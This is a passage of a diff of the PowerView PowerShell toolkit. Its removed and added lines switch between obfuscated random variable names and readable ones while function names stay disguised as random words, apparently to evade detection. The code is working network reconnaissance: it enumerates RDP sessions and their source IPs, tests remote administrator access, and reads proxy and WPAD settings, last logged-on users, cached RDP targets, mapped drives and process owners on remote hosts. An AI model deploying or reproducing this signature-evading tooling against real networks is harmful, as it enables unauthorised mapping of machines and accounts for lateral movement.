+                $Offset = $ppSessionInfo.ToInt64()
+                if (($Result -ne 0) -and ($Offset -gt 0)) {
+                    $Increment = $WTS_SESSION_INFO_1::GetSize()
+                    for ($i = 0; ($i -lt $pCount); $i++) {
+                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
+                        $Info = $NewIntPtr -as $WTS_SESSION_INFO_1
+                        $RDPSession = New-Object PSObject
                         if ($Info.pHostName) {
-                            $SPvcmVuz99 | Add-Member Noteproperty 'ComputerName' $Info.pHostName
+                            $RDPSession | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                         }
                         else {
-                            $SPvcmVuz99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
+                            $RDPSession | Add-Member Noteproperty 'ComputerName' $Computer
                         }
-                        $SPvcmVuz99 | Add-Member Noteproperty 'SessionName' $Info.pSessionName
+                        $RDPSession | Add-Member Noteproperty 'SessionName' $Info.pSessionName
                         if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
-                            $SPvcmVuz99 | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
+                            $RDPSession | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                         }
                         else {
-                            $SPvcmVuz99 | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
+                            $RDPSession | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                         }
-                        $SPvcmVuz99 | Add-Member Noteproperty 'ID' $Info.SessionID
-                        $SPvcmVuz99 | Add-Member Noteproperty 'State' $Info.State
-                        $DgfWZFrF99 = [IntPtr]::Zero
-                        $fRxZfNtQ99 = 0
-                        $zBVlYYvn99 = $ppPvwAgU99::WTSQuerySessionInformation($TSTkwzwk99, $Info.SessionID, 14, [ref]$DgfWZFrF99, [ref]$fRxZfNtQ99);$MJcEOQfi99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
-                        if ($zBVlYYvn99 -eq 0) {
-                            Write-Verbose "[sprucing] Error: $(([ComponentModel.Win32Exception] $MJcEOQfi99).Message)"
+                        $RDPSession | Add-Member Noteproperty 'ID' $Info.SessionID
+                        $RDPSession | Add-Member Noteproperty 'State' $Info.State
+                        $ppBuffer = [IntPtr]::Zero
+                        $pBytesReturned = 0
+                        $Result2 = $Wtsapi32::WTSQuerySessionInformation($Handle, $Info.SessionID, 14, [ref]$ppBuffer, [ref]$pBytesReturned);$LastError2 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                        if ($Result2 -eq 0) {
+                            Write-Verbose "[Brooke] Error: $(([ComponentModel.Win32Exception] $LastError2).Message)"
                         }
                         else {
-                            $tOZXPXDf99 = $DgfWZFrF99.ToInt64()
-                            $wtMnQwrr99 = New-Object System.Intptr -ArgumentList $tOZXPXDf99
-                            $Info2 = $wtMnQwrr99 -as $sKmvEYbz99
-                            $fOClxxNd99 = $Info2.Address
-                            if ($fOClxxNd99[2] -ne 0) {
-                                $fOClxxNd99 = [String]$fOClxxNd99[2]+'.'+[String]$fOClxxNd99[3]+'.'+[String]$fOClxxNd99[4]+'.'+[String]$fOClxxNd99[5]
+                            $Offset2 = $ppBuffer.ToInt64()
+                            $NewIntPtr2 = New-Object System.Intptr -ArgumentList $Offset2
+                            $Info2 = $NewIntPtr2 -as $WTS_CLIENT_ADDRESS
+                            $SourceIP = $Info2.Address
+                            if ($SourceIP[2] -ne 0) {
+                                $SourceIP = [String]$SourceIP[2]+'.'+[String]$SourceIP[3]+'.'+[String]$SourceIP[4]+'.'+[String]$SourceIP[5]
                             }
                             else {
-                                $fOClxxNd99 = $Null
+                                $SourceIP = $Null
                             }
-                            $SPvcmVuz99 | Add-Member Noteproperty 'SourceIP' $fOClxxNd99
-                            $SPvcmVuz99.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
-                            $SPvcmVuz99
-                            $Null = $ppPvwAgU99::WTSFreeMemory($DgfWZFrF99)
-                            $KUsFrgdb99 += $TYJIVmOK99
+                            $RDPSession | Add-Member Noteproperty 'SourceIP' $SourceIP
+                            $RDPSession.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
+                            $RDPSession
+                            $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)
+                            $Offset += $Increment
                         }
                     }
-                    $Null = $ppPvwAgU99::WTSFreeMemoryEx(2, $oUzPXxNr99, $vUANPdTP99)
+                    $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)
                 }
                 else {
-                    Write-Verbose "[sprucing] Error: $(([ComponentModel.Win32Exception] $HWqgzfQS99).Message)"
+                    Write-Verbose "[Brooke] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                 }
-                $Null = $ppPvwAgU99::WTSCloseServer($TSTkwzwk99)
+                $Null = $Wtsapi32::WTSCloseServer($Handle)
             }
             else {
-                Write-Verbose "[sprucing] Error opening the Remote Desktop Session Host (RD Session Host) server for: $VrEmrUHq99"
+                Write-Verbose "[Brooke] Error opening the Remote Desktop Session Host (RD Session Host) server for: $ComputerName"
             }
         }
     }
     END {
-        if ($WUqPycDr99) {
-            Nina -TokenHandle $WUqPycDr99
+        if ($LogonToken) {
+            choke -TokenHandle $LogonToken
         }
     }
 }
-function Abelson {
+function milkshake {
     [OutputType('PowerView.AdminAccess')]
     [CmdletBinding()]
     Param(
@@ -7489,40 +7489,40 @@ function Abelson {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $VrEmrUHq99 = 'localhost',
+        $ComputerName = 'localhost',
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
         if ($PSBoundParameters['Credential']) {
-            $WUqPycDr99 = admonished -Credential $gxazvivN99
+            $LogonToken = locale -Credential $Credential
         }
     }
     PROCESS {
-        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
-            $TSTkwzwk99 = $hVuDLVbw99::OpenSCManagerW("\\$cXOPCAwl99", 'ServicesActive', 0xF003F);$HWqgzfQS99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
-            $dohfMDea99 = New-Object PSObject
-            $dohfMDea99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
-            if ($TSTkwzwk99 -ne 0) {
-                $Null = $hVuDLVbw99::CloseServiceHandle($TSTkwzwk99)
-                $dohfMDea99 | Add-Member Noteproperty 'IsAdmin' $True
+        ForEach ($Computer in $ComputerName) {
+            $Handle = $Advapi32::OpenSCManagerW("\\$Computer", 'ServicesActive', 0xF003F);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            $IsAdmin = New-Object PSObject
+            $IsAdmin | Add-Member Noteproperty 'ComputerName' $Computer
+            if ($Handle -ne 0) {
+                $Null = $Advapi32::CloseServiceHandle($Handle)
+                $IsAdmin | Add-Member Noteproperty 'IsAdmin' $True
             }
             else {
-                Write-Verbose "[Abelson] Error: $(([ComponentModel.Win32Exception] $HWqgzfQS99).Message)"
-                $dohfMDea99 | Add-Member Noteproperty 'IsAdmin' $False
+                Write-Verbose "[milkshake] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+                $IsAdmin | Add-Member Noteproperty 'IsAdmin' $False
             }
-            $dohfMDea99.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
-            $dohfMDea99
+            $IsAdmin.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
+            $IsAdmin
         }
     }
     END {
-        if ($WUqPycDr99) {
-            Nina -TokenHandle $WUqPycDr99
+        if ($LogonToken) {
+            choke -TokenHandle $LogonToken
         }
     }
 }
-function tussled {
+function scrappy {
     [OutputType('PowerView.ComputerSite')]
     [CmdletBinding()]
     Param(
@@ -7530,50 +7530,50 @@ function tussled {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $VrEmrUHq99 = 'localhost',
+        $ComputerName = 'localhost',
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
         if ($PSBoundParameters['Credential']) {
-            $WUqPycDr99 = admonished -Credential $gxazvivN99
+            $LogonToken = locale -Credential $Credential
         }
     }
     PROCESS {
-        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
-            if ($cXOPCAwl99 -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
-                $wStfQnQJ99 = $cXOPCAwl99
-                $cXOPCAwl99 = [System.Net.Dns]::GetHostByAddress($cXOPCAwl99) | Select-Object -ExpandProperty HostName
+        ForEach ($Computer in $ComputerName) {
+            if ($Computer -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
+                $IPAddress = $Computer
+                $Computer = [System.Net.Dns]::GetHostByAddress($Computer) | Select-Object -ExpandProperty HostName
             }
             else {
-                $wStfQnQJ99 = @(erupt -ComputerName $cXOPCAwl99)[0].IPAddress
+                $IPAddress = @(Tuscon -ComputerName $Computer)[0].IPAddress
             }
-            $TuHFtCTR99 = [IntPtr]::Zero
-            $fYOedlSN99 = $eIekXKWj99::DsGetSiteName($cXOPCAwl99, [ref]$TuHFtCTR99)
-            $UFJqwyIQ99 = New-Object PSObject
-            $UFJqwyIQ99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
-            $UFJqwyIQ99 | Add-Member Noteproperty 'IPAddress' $wStfQnQJ99
-            if ($fYOedlSN99 -eq 0) {
-                $nqApdsmI99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($TuHFtCTR99)
-                $UFJqwyIQ99 | Add-Member Noteproperty 'SiteName' $nqApdsmI99
+            $PtrInfo = [IntPtr]::Zero
+            $Result = $Netapi32::DsGetSiteName($Computer, [ref]$PtrInfo)
+            $ComputerSite = New-Object PSObject
+            $ComputerSite | Add-Member Noteproperty 'ComputerName' $Computer
+            $ComputerSite | Add-Member Noteproperty 'IPAddress' $IPAddress
+            if ($Result -eq 0) {
+                $Sitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($PtrInfo)
+                $ComputerSite | Add-Member Noteproperty 'SiteName' $Sitename
             }
             else {
-                Write-Verbose "[tussled] Error: $(([ComponentModel.Win32Exception] $fYOedlSN99).Message)"
-                $UFJqwyIQ99 | Add-Member Noteproperty 'SiteName' ''
+                Write-Verbose "[scrappy] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
+                $ComputerSite | Add-Member Noteproperty 'SiteName' ''
             }
-            $UFJqwyIQ99.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')
-            $Null = $eIekXKWj99::NetApiBufferFree($TuHFtCTR99)
-            $UFJqwyIQ99
+            $ComputerSite.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')
+            $Null = $Netapi32::NetApiBufferFree($PtrInfo)
+            $ComputerSite
         }
     }
     END {
-        if ($WUqPycDr99) {
-            Nina -TokenHandle $WUqPycDr99
+        if ($LogonToken) {
+            choke -TokenHandle $LogonToken
         }
     }
 }
-function Amritsar {
+function graceless {
     [OutputType('PowerView.ProxySettings')]
     [CmdletBinding()]
     Param(
@@ -7581,56 +7581,56 @@ function Amritsar {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $VrEmrUHq99 = $Env:COMPUTERNAME,
+        $ComputerName = $Env:COMPUTERNAME,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     PROCESS {
-        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
+        ForEach ($Computer in $ComputerName) {
             try {
-                $eWmMvJNh99 = @{
+                $WmiArguments = @{
                     'List' = $True
                     'Class' = 'StdRegProv'
                     'Namespace' = 'root\default'
-                    'Computername' = $cXOPCAwl99
+                    'Computername' = $Computer
                     'ErrorAction' = 'Stop'
                 }
-                if ($PSBoundParameters['Credential']) { $eWmMvJNh99['Credential'] = $gxazvivN99 }
-                $THcCEApd99 = Get-WmiObject @WmiArguments
+                if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }
+                $RegProvider = Get-WmiObject @WmiArguments
                 $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'
                 $HKCU = 2147483649
-                $FeBmzisx99 = $THcCEApd99.GetStringValue($HKCU, $Key, 'ProxyServer').sValue
-                $bgiQmhUe99 = $THcCEApd99.GetStringValue($HKCU, $Key, 'AutoConfigURL').sValue
+                $ProxyServer = $RegProvider.GetStringValue($HKCU, $Key, 'ProxyServer').sValue
+                $AutoConfigURL = $RegProvider.GetStringValue($HKCU, $Key, 'AutoConfigURL').sValue
                 $Wpad = ''
-                if ($bgiQmhUe99 -and ($bgiQmhUe99 -ne '')) {
+                if ($AutoConfigURL -and ($AutoConfigURL -ne '')) {
                     try {
-                        $Wpad = (New-Object Net.WebClient).DownloadString($bgiQmhUe99)
+                        $Wpad = (New-Object Net.WebClient).DownloadString($AutoConfigURL)
                     }
                     catch {
-                        Write-Warning "[Amritsar] Error connecting to AutoConfigURL : $bgiQmhUe99"
+                        Write-Warning "[graceless] Error connecting to AutoConfigURL : $AutoConfigURL"
                     }
                 }
-                if ($FeBmzisx99 -or $bgiQmhUe99) {
+                if ($ProxyServer -or $AutoConfigUrl) {
                     $Out = New-Object PSObject
-                    $Out | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
-                    $Out | Add-Member Noteproperty 'ProxyServer' $FeBmzisx99
-                    $Out | Add-Member Noteproperty 'AutoConfigURL' $bgiQmhUe99
+                    $Out | Add-Member Noteproperty 'ComputerName' $Computer
+                    $Out | Add-Member Noteproperty 'ProxyServer' $ProxyServer
+                    $Out | Add-Member Noteproperty 'AutoConfigURL' $AutoConfigURL
                     $Out | Add-Member Noteproperty 'Wpad' $Wpad
                     $Out.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                     $Out
                 }
                 else {
-                    Write-Warning "[Amritsar] No proxy settings found for $VrEmrUHq99"
+                    Write-Warning "[graceless] No proxy settings found for $ComputerName"
                 }
             }
             catch {
-                Write-Warning "[Amritsar] Error enumerating proxy settings for $VrEmrUHq99 : $_"
+                Write-Warning "[graceless] Error enumerating proxy settings for $ComputerName : $_"
             }
         }
     }
 }
-function evangelize {
+function casseroled {
     [OutputType('PowerView.LastLoggedOnUser')]
     [CmdletBinding()]
     Param(
@@ -7638,40 +7638,40 @@ function evangelize {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $VrEmrUHq99 = 'localhost',
+        $ComputerName = 'localhost',
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     PROCESS {
-        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
+        ForEach ($Computer in $ComputerName) {
             $HKLM = 2147483650
-            $eWmMvJNh99 = @{
+            $WmiArguments = @{
                 'List' = $True
                 'Class' = 'StdRegProv'
                 'Namespace' = 'root\default'
-                'Computername' = $cXOPCAwl99
+                'Computername' = $Computer
                 'ErrorAction' = 'SilentlyContinue'
             }
-            if ($PSBoundParameters['Credential']) { $eWmMvJNh99['Credential'] = $gxazvivN99 }
+            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }
             try {
                 $Reg = Get-WmiObject @WmiArguments
                 $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                 $Value = 'LastLoggedOnUser'
-                $ckQOEwvL99 = $Reg.GetStringValue($HKLM, $Key, $Value).sValue
-                $qcoKLChi99 = New-Object PSObject
-                $qcoKLChi99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
-                $qcoKLChi99 | Add-Member Noteproperty 'LastLoggedOn' $ckQOEwvL99
-                $qcoKLChi99.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
-                $qcoKLChi99
+                $LastUser = $Reg.GetStringValue($HKLM, $Key, $Value).sValue
+                $LastLoggedOn = New-Object PSObject
+                $LastLoggedOn | Add-Member Noteproperty 'ComputerName' $Computer
+                $LastLoggedOn | Add-Member Noteproperty 'LastLoggedOn' $LastUser
+                $LastLoggedOn.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
+                $LastLoggedOn
             }
             catch {
-                Write-Warning "[evangelize] Error opening remote registry on $cXOPCAwl99. Remote registry likely not enabled."
+                Write-Warning "[casseroled] Error opening remote registry on $Computer. Remote registry likely not enabled."
             }
         }
     }
 }
-function mosque {
+function colleagues {
     [OutputType('PowerView.CachedRDPConnection')]
     [CmdletBinding()]
     Param(
@@ -7679,72 +7679,72 @@ function mosque {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $VrEmrUHq99 = 'localhost',
+        $ComputerName = 'localhost',
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     PROCESS {
-        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
+        ForEach ($Computer in $ComputerName) {
             $HKU = 2147483651
-            $eWmMvJNh99 = @{
+            $WmiArguments = @{
                 'List' = $True
                 'Class' = 'StdRegProv'
                 'Namespace' = 'root\default'
-                'Computername' = $cXOPCAwl99
+                'Computername' = $Computer
                 'ErrorAction' = 'Stop'
             }
-            if ($PSBoundParameters['Credential']) { $eWmMvJNh99['Credential'] = $gxazvivN99 }
+            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }
             try {
                 $Reg = Get-WmiObject @WmiArguments
-                $dvPUhiLr99 = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
-                ForEach ($XnuUVOWC99 in $dvPUhiLr99) {
+                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
+                ForEach ($UserSID in $UserSIDs) {
                     try {
                         if ($PSBoundParameters['Credential']) {
-                            $IsWOPBva99 = woodmen -ObjectSid $XnuUVOWC99 -Credential $gxazvivN99
+                            $UserName = armpits -ObjectSid $UserSID -Credential $Credential
                         }
                         else {
-                            $IsWOPBva99 = woodmen -ObjectSid $XnuUVOWC99
+                            $UserName = armpits -ObjectSid $UserSID
                         }
-                        $khpugUEc99 = $Reg.EnumValues($HKU,"$XnuUVOWC99\Software\Microsoft\Terminal Server Client\Default").sNames
-                        ForEach ($BgZScByU99 in $khpugUEc99) {
-                            if ($BgZScByU99 -match 'MRU.*') {
-                                $ZAvweIpx99 = $Reg.GetStringValue($HKU, "$XnuUVOWC99\Software\Microsoft\Terminal Server Client\Default", $BgZScByU99).sValue
-                                $baPgXeJe99 = New-Object PSObject
-                                $baPgXeJe99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
-                                $baPgXeJe99 | Add-Member Noteproperty 'UserName' $IsWOPBva99
-                                $baPgXeJe99 | Add-Member Noteproperty 'UserSID' $XnuUVOWC99
-                                $baPgXeJe99 | Add-Member Noteproperty 'TargetServer' $ZAvweIpx99
-                                $baPgXeJe99 | Add-Member Noteproperty 'UsernameHint' $Null
-                                $baPgXeJe99.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
-                                $baPgXeJe99
+                        $ConnectionKeys = $Reg.EnumValues($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Default").sNames
+                        ForEach ($Connection in $ConnectionKeys) {
+                            if ($Connection -match 'MRU.*') {
+                                $TargetServer = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Default", $Connection).sValue
+                                $FoundConnection = New-Object PSObject
+                                $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer
+                                $FoundConnection | Add-Member Noteproperty 'UserName' $UserName
+                                $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID
+                                $FoundConnection | Add-Member Noteproperty 'TargetServer' $TargetServer
+                                $FoundConnection | Add-Member Noteproperty 'UsernameHint' $Null
+                                $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
+                                $FoundConnection
                             }
                         }
-                        $QiSQYhsu99 = $Reg.EnumKey($HKU,"$XnuUVOWC99\Software\Microsoft\Terminal Server Client\Servers").sNames
-                        ForEach ($mSxqoOjK99 in $QiSQYhsu99) {
-                            $fyzcAVFZ99 = $Reg.GetStringValue($HKU, "$XnuUVOWC99\Software\Microsoft\Terminal Server Client\Servers\$mSxqoOjK99", 'UsernameHint').sValue
-                            $baPgXeJe99 = New-Object PSObject
-                            $baPgXeJe99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
-                            $baPgXeJe99 | Add-Member Noteproperty 'UserName' $IsWOPBva99
-                            $baPgXeJe99 | Add-Member Noteproperty 'UserSID' $XnuUVOWC99
-                            $baPgXeJe99 | Add-Member Noteproperty 'TargetServer' $mSxqoOjK99
-                            $baPgXeJe99 | Add-Member Noteproperty 'UsernameHint' $fyzcAVFZ99
-                            $baPgXeJe99.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
-                            $baPgXeJe99
+                        $ServerKeys = $Reg.EnumKey($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Servers").sNames
+                        ForEach ($Server in $ServerKeys) {
+                            $UsernameHint = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Servers\$Server", 'UsernameHint').sValue
+                            $FoundConnection = New-Object PSObject
+                            $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer
+                            $FoundConnection | Add-Member Noteproperty 'UserName' $UserName
+                            $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID
+                            $FoundConnection | Add-Member Noteproperty 'TargetServer' $Server
+                            $FoundConnection | Add-Member Noteproperty 'UsernameHint' $UsernameHint
+                            $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
+                            $FoundConnection
                         }
                     }
                     catch {
-                        Write-Verbose "[mosque] Error: $_"
+                        Write-Verbose "[colleagues] Error: $_"
                     }
                 }
             }
             catch {
-                Write-Warning "[mosque] Error accessing $cXOPCAwl99, likely insufficient permissions or firewall rules on host: $_"
+                Write-Warning "[colleagues] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_"
             }
         }
     }
 }
-function doughtier {
+function fixture {
     [OutputType('PowerView.RegMountedDrive')]
     [CmdletBinding()]
     Param(
@@ -7752,65 +7752,65 @@ function doughtier {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $VrEmrUHq99 = 'localhost',
+        $ComputerName = 'localhost',
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     PROCESS {
-        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
+        ForEach ($Computer in $ComputerName) {
             $HKU = 2147483651
-            $eWmMvJNh99 = @{
+            $WmiArguments = @{
                 'List' = $True
                 'Class' = 'StdRegProv'
                 'Namespace' = 'root\default'
-                'Computername' = $cXOPCAwl99
+                'Computername' = $Computer
                 'ErrorAction' = 'Stop'
             }
-            if ($PSBoundParameters['Credential']) { $eWmMvJNh99['Credential'] = $gxazvivN99 }
+            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }
             try {
                 $Reg = Get-WmiObject @WmiArguments
-                $dvPUhiLr99 = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
-                ForEach ($XnuUVOWC99 in $dvPUhiLr99) {
+                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
+                ForEach ($UserSID in $UserSIDs) {
                     try {
                         if ($PSBoundParameters['Credential']) {
-                            $IsWOPBva99 = woodmen -ObjectSid $XnuUVOWC99 -Credential $gxazvivN99
+                            $UserName = armpits -ObjectSid $UserSID -Credential $Credential
                         }
                         else {
-                            $IsWOPBva99 = woodmen -ObjectSid $XnuUVOWC99
+                            $UserName = armpits -ObjectSid $UserSID
                         }
-                        $UkCqCRRe99 = ($Reg.EnumKey($HKU, "$XnuUVOWC99\Network")).sNames
-                        ForEach ($eiDBhxZJ99 in $UkCqCRRe99) {
-                            $sRjSCbXj99 = $Reg.GetStringValue($HKU, "$XnuUVOWC99\Network\$eiDBhxZJ99", 'ProviderName').sValue
-                            $jUpOxKII99 = $Reg.GetStringValue($HKU, "$XnuUVOWC99\Network\$eiDBhxZJ99", 'RemotePath').sValue
-                            $KThGlPjO99 = $Reg.GetStringValue($HKU, "$XnuUVOWC99\Network\$eiDBhxZJ99", 'UserName').sValue
-                            if (-not $IsWOPBva99) { $IsWOPBva99 = '' }
-                            if ($jUpOxKII99 -and ($jUpOxKII99 -ne '')) {
-                                $ZPmfXjyw99 = New-Object PSObject
-                                $ZPmfXjyw99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
-                                $ZPmfXjyw99 | Add-Member Noteproperty 'UserName' $IsWOPBva99
-                                $ZPmfXjyw99 | Add-Member Noteproperty 'UserSID' $XnuUVOWC99
-                                $ZPmfXjyw99 | Add-Member Noteproperty 'DriveLetter' $eiDBhxZJ99
-                                $ZPmfXjyw99 | Add-Member Noteproperty 'ProviderName' $sRjSCbXj99
-                                $ZPmfXjyw99 | Add-Member Noteproperty 'RemotePath' $jUpOxKII99
-                                $ZPmfXjyw99 | Add-Member Noteproperty 'DriveUserName' $KThGlPjO99
-                                $ZPmfXjyw99.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
-                                $ZPmfXjyw99
+                        $DriveLetters = ($Reg.EnumKey($HKU, "$UserSID\Network")).sNames
+                        ForEach ($DriveLetter in $DriveLetters) {
+                            $ProviderName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'ProviderName').sValue
+                            $RemotePath = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'RemotePath').sValue
+                            $DriveUserName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'UserName').sValue
+                            if (-not $UserName) { $UserName = '' }
+                            if ($RemotePath -and ($RemotePath -ne '')) {
+                                $MountedDrive = New-Object PSObject
+                                $MountedDrive | Add-Member Noteproperty 'ComputerName' $Computer
+                                $MountedDrive | Add-Member Noteproperty 'UserName' $UserName
+                                $MountedDrive | Add-Member Noteproperty 'UserSID' $UserSID
+                                $MountedDrive | Add-Member Noteproperty 'DriveLetter' $DriveLetter
+                                $MountedDrive | Add-Member Noteproperty 'ProviderName' $ProviderName
+                                $MountedDrive | Add-Member Noteproperty 'RemotePath' $RemotePath
+                                $MountedDrive | Add-Member Noteproperty 'DriveUserName' $DriveUserName
+                                $MountedDrive.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
+                                $MountedDrive
                             }
                         }
                     }
                     catch {
-                        Write-Verbose "[doughtier] Error: $_"
+                        Write-Verbose "[fixture] Error: $_"
                     }
                 }
             }
             catch {
-                Write-Warning "[doughtier] Error accessing $cXOPCAwl99, likely insufficient permissions or firewall rules on host: $_"
+                Write-Warning "[fixture] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_"
             }
         }
     }
 }
-function console {
+function frontiersman {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.UserProcess')]
     [CmdletBinding()]
@@ -7819,38 +7819,38 @@ function console {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $VrEmrUHq99 = 'localhost',
+        $ComputerName = 'localhost',
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     PROCESS {
-        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
+        ForEach ($Computer in $ComputerName) {
             try {
-                $eWmMvJNh99 = @{
-                    'ComputerName' = $VrEmrUHq99
+                $WmiArguments = @{
+                    'ComputerName' = $ComputerName
                     'Class' = 'Win32_process'
                 }
-                if ($PSBoundParameters['Credential']) { $eWmMvJNh99['Credential'] = $gxazvivN99 }
+                if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }
                 Get-WMIobject @WmiArguments | ForEach-Object {
                     $Owner = $_.getowner();
-                    $oRjANeVM99 = New-Object PSObject
-                    $oRjANeVM99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
-                    $oRjANeVM99 | Add-Member Noteproperty 'ProcessName' $_.ProcessName
-                    $oRjANeVM99 | Add-Member Noteproperty 'ProcessID' $_.ProcessID
-                    $oRjANeVM99 | Add-Member Noteproperty 'Domain' $Owner.Domain
-                    $oRjANeVM99 | Add-Member Noteproperty 'User' $Owner.User
-                    $oRjANeVM99.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
-                    $oRjANeVM99
+                    $Process = New-Object PSObject
+                    $Process | Add-Member Noteproperty 'ComputerName' $Computer
+                    $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName
